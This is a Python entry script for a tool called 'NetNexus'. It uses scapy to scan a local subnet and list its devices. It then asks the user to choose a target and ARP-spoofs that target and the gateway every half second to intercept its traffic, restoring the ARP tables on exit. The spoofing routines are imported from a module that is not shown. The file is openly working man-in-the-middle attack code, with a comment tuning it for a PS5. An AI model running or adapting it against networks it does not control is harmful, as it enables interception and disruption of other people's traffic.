import scapy.all as scapy
import os
import time
from core import scanner, spoof

def main():
    # CONFIGURATION: Update 'wlan0' with your actual interface (ip a)
    scapy.conf.iface = "wlan0" 
    
    if os.geteuid() != 0:
        print("[-] NetNexus requires root. Run with: sudo python main.py")
        return

    print("=== NetNexus: Complete Rebuild ===")
    ip_range = "192.168.8.1/24"
    
    print(f"[*] Scanning {ip_range} for devices...")
    devices = scanner.scan(ip_range)
    
    print("\nID\tIP Address\t\tMAC Address\t\tDevice Name")
    print("-" * 90)
    for index, device in enumerate(devices):
        print(f"{index}\t{device['ip']}\t\t{device['mac']}\t{device['name']}")

    try:
        choice = int(input("\nSelect Target ID: "))
        target = devices[choice]
        
        gateway_ip = "192.168.8.1"
        target_ip = target['ip']
        target_mac = target['mac']

        print(f"[*] Resolving Gateway MAC...")
        gateway_mac, _ = spoof.get_device_info(gateway_ip)

        print(f"[*] Intercepting {target_ip} ({target['name']})...")
        while True:
            # Aggressive 0.5s interval for PS5 stability
            spoof.spoof(target_ip, gateway_ip, target_mac, gateway_mac)
            time.sleep(0.5) 
            
    except (KeyboardInterrupt, IndexError):
        print("\n[*] Shutting down. Healing the network...")
        if 'target_ip' in locals():
            spoof.restore(target_ip, gateway_ip)
            spoof.restore(gateway_ip, target_ip)
        print("[+] Success.")

if __name__ == "__main__":
    main()
